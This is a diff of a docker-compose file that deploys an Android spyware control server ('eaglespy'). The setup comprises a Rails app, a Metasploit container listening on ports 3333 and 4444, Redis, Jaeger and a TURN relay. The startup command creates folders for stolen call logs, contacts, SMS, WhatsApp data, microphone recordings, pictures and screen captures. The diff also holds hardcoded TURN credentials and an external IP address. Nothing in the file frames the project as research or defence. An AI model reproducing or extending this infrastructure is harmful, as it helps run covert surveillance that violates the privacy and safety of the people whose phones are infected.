@@ -1,20 +1,54 @@
 version: "3.7"
 services:
   rails-app:
-    image: costincanciu/android-spyware:latest
+    build:
+      context: ../
+      dockerfile: docker/app-rails-server/Dockerfile
+    image: android-spyware-v5:latest
     depends_on:
       - db
       - metasploit
+      - jaeger
+      - redis
+      - coturn
+    env_file:
+      - ../.env
+      - ../.env.tracing
     ports:
-      - "80:80"
+      - "127.0.0.1:9099:3000"
     volumes:
-      - ./files:/app/android-spyware/files
+      - ../:/app/android-spyware
       - //var/run/docker.sock://var/run/docker.sock
-    entrypoint: sh -c "mkdir -p /app/android-spyware/files/payloads /app/android-spyware/files/dumps/calllogs_dumps /app/android-spyware/files/dumps/contacts_dumps /app/android-spyware/files/dumps/microphone_recs /app/android-spyware/files/dumps/pictures /app/android-spyware/files/dumps/screen_snaps /app/android-spyware/files/dumps/sms_messages_dumps /app/android-spyware/files/dumps/whatsapp | rails s -b 0.0.0.0 -p 80"
+    entrypoint: sh -c "rm -f tmp/pids/server.pid && bundle check || bundle install && mkdir -p /app/android-spyware/files/payloads /app/android-spyware/files/dumps/calllogs_dumps /app/android-spyware/files/dumps/contacts_dumps /app/android-spyware/files/dumps/microphone_recs /app/android-spyware/files/dumps/pictures /app/android-spyware/files/dumps/screen_snaps /app/android-spyware/files/dumps/sms_messages_dumps /app/android-spyware/files/dumps/whatsapp && rails db:migrate && rails s -b 0.0.0.0 -p 3000"
     tty: true
+    mem_limit: 2g
+    memswap_limit: 2g
     environment:
-      ADB_HOST: gateway.docker.internal
-      #MAPS_API_KEY: YOUR KEY HERE
+      ADB_HOST: host.docker.internal
+      JAEGER_HOST: jaeger-collector
+      JAEGER_PORT: 6831
+      OTEL_TRACES_EXPORTER: jaeger
+      POSTGRES_USER: ${POSTGRES_USER:-postgres}
+      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-postgres}
+      ANDROIDSPYWARE_DATABASE_HOST: db
+      REDIS_URL: redis://redis:6379/1
+      TURN_SERVER: turn:coturn:3478
+      TURN_USER: ${TURN_USER:-eaglespy}
+      TURN_PASSWORD: ${TURN_PASSWORD:-eaglespy_secret}
+  jaeger:
+    image: jaegertracing/all-in-one:latest
+    container_name: jaeger-collector
+    environment:
+      COLLECTOR_ZIPKIN_HTTP_PORT: 9411
+      COLLECTOR_OTLP_ENABLED: "true"
+    ports:
+      - "6831:6831/udp"
+      - "6832:6832/udp"
+      - "16686:16686"
+      - "14250:14250"
+      - "9411:9411"
+    labels:
+      - "com.example.description=Jaeger tracing collector for android-spyware"
   db:
     image: costincanciu/android-spyware-db:latest
     ports:
@@ -31,5 +65,40 @@ services:
     - "3333:3333"
     - "4444:4444"
     user: root
+    volumes:
+      - ../files:/root/files
+  redis:
+    image: redis:7-alpine
+    container_name: redis
+    ports:
+      - "6379:6379"
+    volumes:
+      - redis_data:/data
+    command: redis-server --appendonly yes
+  coturn:
+    image: coturn/coturn:latest
+    container_name: coturn
+    ports:
+      - "3478:3478"
+      - "3478:3478/udp"
+      - "5349:5349"
+      - "5349:5349/udp"
+      - "49152-49200:49152-49200/udp"
+    environment:
+      TURN_USER: ${TURN_USER:-eaglespy}
+      TURN_PASSWORD: ${TURN_PASSWORD:-EagleSpy2024Secure!}
+    command: >
+      -n
+      --log-file=stdout
+      --min-port=49152
+      --max-port=49200
+      --fingerprint
+      --lt-cred-mech
+      --user=${TURN_USER:-eaglespy}:${TURN_PASSWORD:-EagleSpy2024Secure!}
+      --realm=213.91.211.150
+      --external-ip=213.91.211.150
+      --listening-ip=0.0.0.0
+      --no-stun
 volumes:
   db:
+  redis_data:
